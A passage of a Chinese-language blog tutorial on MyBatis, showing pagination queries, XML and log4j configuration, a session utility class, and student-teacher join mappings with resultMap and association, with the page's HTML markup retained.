map)</span>;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getUserLimit&quot;</span> parameterType=<span class="string">&quot;map&quot;</span> resultMap=<span class="string">&quot;userMap&quot;</span>&gt;</span><br><span class="line">       select * from user limit #&#123;startIndex&#125;,#&#123;pageSize&#125;</span><br><span class="line">   &lt;/select&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span>   <span class="comment">//使用注解</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserLimit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span>sqlSession.getMapper(UserMapper.class);</span><br><span class="line">        HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;startIndex&quot;</span>,<span class="number">4</span>);<span class="comment">//从第几条数据显示 4+1 index从0开始</span></span><br><span class="line">        map.put(<span class="string">&quot;pageSize&quot;</span>,<span class="number">4</span>);<span class="comment">//每页显式的条数</span></span><br><span class="line"></span><br><span class="line">        List&lt;User&gt; userLimit = mapper.getUserLimit(map);</span><br><span class="line">        <span class="keyword">for</span> (User user : userLimit)&#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">        sqlSession.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h3 id="分页查询RowBounds"><a href="#分页查询RowBounds" class="headerlink" title="分页查询RowBounds"></a>分页查询RowBounds</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    分页查询RowBounds</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">getUserRowBounds</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getUserRowBounds&quot;</span> resultMap=<span class="string">&quot;userMap&quot;</span>&gt;</span><br><span class="line">        select *from user</span><br><span class="line">    &lt;/select&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>   <span class="title function_">getUserRowBounds</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line"><span class="comment">//      //使用分页</span></span><br><span class="line">        <span class="type">RowBounds</span> <span class="variable">rowBounds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowBounds</span>(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        List&lt;User&gt; userList = sqlSession.selectList(<span class="string">&quot;com.neuedu.mapper.UserMapper.getUserRowBounds&quot;</span>, <span class="literal">null</span>, rowBounds);</span><br><span class="line">        <span class="keyword">for</span> (User user:userList)&#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h2 id="联合查询-Student-Teacher"><a href="#联合查询-Student-Teacher" class="headerlink" title="联合查询-Student&amp;Teacher"></a>联合查询-Student&amp;Teacher</h2><p>小总结：引入前面的依赖和工具集utils</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">url=jdbc:mysql:<span class="comment">//localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">username=root</span><br><span class="line">password=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">log4j.rootLogger=DEBUG,console,file</span><br><span class="line">#</span><br><span class="line">log4j.appender.console = org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.console.Target = System.out</span><br><span class="line">log4j.appender.console.Threshold=DEBUG</span><br><span class="line">log4j.appender.console.layout = org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.console.layout.ConversionPattern=[%c]-%m%n</span><br><span class="line">#</span><br><span class="line">log4j.appender.file = org.apache.log4j.RollingFileAppender</span><br><span class="line">log4j.appender.file.File=./log/neu.log</span><br><span class="line">log4j.appender.file.MaxFileSize=10mb</span><br><span class="line">log4j.appender.file.Threshold=DEBUG</span><br><span class="line">log4j.appender.file.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.file.layout.ConversionPattern=[%p][%d&#123;yy-MM-dd&#125;][%c]%m%n</span><br><span class="line">#</span><br><span class="line">log4j.logger.org.mybatis=DEBUG</span><br><span class="line">log4j.logger.java.sql=DEBUG</span><br><span class="line">log4j.logger.java.sql.Statement=DEBUG</span><br><span class="line">log4j.logger.java.sql.ResultSet=DEBUG</span><br><span class="line">log4j.logger.java.sql.PreparedStatement=DEBUG</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--configuration核心配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--导入外部配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置日志 mybatis标准日志--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;setting name=&quot;logImpl&quot; value=&quot;STDOUT_LOGGING&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LOG4J&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置别名   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置别名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.neuedu.pojo.Student&quot; alias=&quot;student&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.neuedu.pojo.Teacher&quot; alias=&quot;teacher&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--扫描实体类的包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.neuedu.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--环境配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--环境变量--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--事务管理器--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?serverTimezone=GMT%2B8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mapper映射文件绑定--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--1.扫描mapper映射文件绑定注册        --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper resource=&quot;com/neuedu/mapper/UserMapper.xml&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--2.class文件 接口文件和mapper映射文件同名且同包--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;mapper class=&quot;com.neuedu.mapper.UserMapper&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--3.扫描包绑定注册    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.neuedu.mapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--4.使用完全限定资源定位符url绑定绝对路径 不建议 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper url=&quot;D:\GoodGoodStudy\21pro_practice\new1\Mybatis_Study\mybatis-02\src\main\java\com\neuedu\dao\UserDao.xml&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisUtils</span> &#123;</span><br><span class="line">    <span class="comment">/*InputStream inputStream;*/</span></span><br><span class="line">    <span class="comment">/*提升作用域*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"><span class="comment">/*代码块*/</span></span><br><span class="line">    <span class="keyword">static</span> &#123;<span class="comment">/*静态码块*/</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;<span class="comment">/*定义resource对象属性*/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory=<span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*sqlSessionFactory存在，就可以获得sqlSession实例（获得sqlSessio连接）</span></span><br><span class="line"><span class="comment">    * return sqlSession包含了大量增删改查方法，mybatis封装好的方法*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSqlSession</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">/*SqlSession sqlSession = sqlSessionFactory.openSession();</span></span><br><span class="line"><span class="comment">        return sqlSession;*/</span></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession(<span class="literal">true</span>);<span class="comment">//自动commit事务，不需要sqlSession.commit();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setSqlSessionFactory</span><span class="params">(SqlSessionFactory sqlSessionFactory)</span> &#123;</span><br><span class="line">        MyBatisUtils.sqlSessionFactory = sqlSessionFactory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="查询学生联合老师信息（多对一）"><a href="#查询学生联合老师信息（多对一）" class="headerlink" title="查询学生联合老师信息（多对一）"></a>查询学生联合老师信息（多对一）</h3><p>建立的实体类Student和Teacher，该情况下Student实体类下外加学生关联的老师属性</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  Integer tid;</span><br><span class="line"><span class="comment">//    组合</span></span><br><span class="line">    <span class="keyword">private</span> Teacher teacher;<span class="comment">//学生关联老师</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    需求：查询所有学生信息、并显示对应老师信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li><p>直接查询，结果集的映射</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">查询学生信息、对应老师信息</span></span><br><span class="line"><span class="comment">思路：</span></span><br><span class="line"><span class="comment">1.直接查询，结果集的映射</span></span><br><span class="line"><span class="comment">M1：按照结果嵌套处理（联表查询） 查询后进行一一对应关系</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;studentTeacher&quot;</span> <span class="attr">type</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sname&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;tid&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;teacher&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tname&quot;</span> <span class="attr">property</span>=<span class="string">&quot;teachername&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getStudentList&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;studentTeacher&quot;</span>&gt;</span></span><br><span class="line">        select s.id as sid,s.name as sname,s.tid tid ,t.name tname</span><br><span class="line">        from stuednt AS s,teacher as t</span><br><span class="line">        where s.tid=t.id;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>使用**<code>resultMap</code>** 中的标签<code>**association</code>** 联表查询，而且此时数据库中的定义的结果集<code>tid</code>和<code>tname</code> 分别要对应定义实体类中的<code>id</code>和<code>teachername</code> </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getStudentList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">    <span class="type">StudentMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(StudentMapper.class);</span><br><span class="line">    List&lt;Student&gt; studentList=mapper.getStudentList();</span><br><span class="line">    <span class="keyword">for</span> (Student student : studentList) &#123;</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>显示出的结果的如下：</p><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 7.png)</p></li><li><p>关联查询查询所有学生信息，并直接对应老师信息</p></li></ul><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getStudentList2&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;studentTeacher2&quot;</span>&gt;</span></span><br><span class="line">        select * from stuednt</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;studentTeacher2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--resultMap字段属性一样可以不用映射        --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;result column=&quot;id&quot; property=&quot;id&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;tid&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">select</span>=<span class="string">&quot;getTeacher&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getTeacher&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;teacher&quot;</span>&gt;</span></span><br><span class="line">        select id,name teacherName from teacher where id=#&#123;tid&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>忘记加<code>@Test</code> 注解所以一时间没做运行</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getStudentList2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(StudentMapper.class);</span><br><span class="line">        List&lt;Student&gt; studentList=mapper.getStudentList2();</span><br><span class="line">        <span class="keyword">for</span> (Student student : studentList) &#123;</span><br><span class="line">            System.out.println(student);</span><br><span class="line">        &#125;</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>运行出的结果如下：</p><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 8.png)</p><h3 id="查询老师联合学生信息（一对多）"><a href="#查询老师联合学生信息（一对多）" class="headerlink" title="查询老师联合学生信息（一对多）"></a>查询老师联合学生信息（一对多）</h3><p>建立的实体类Student和Teacher，该情况下Teacher类中外加一个Student的列表</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 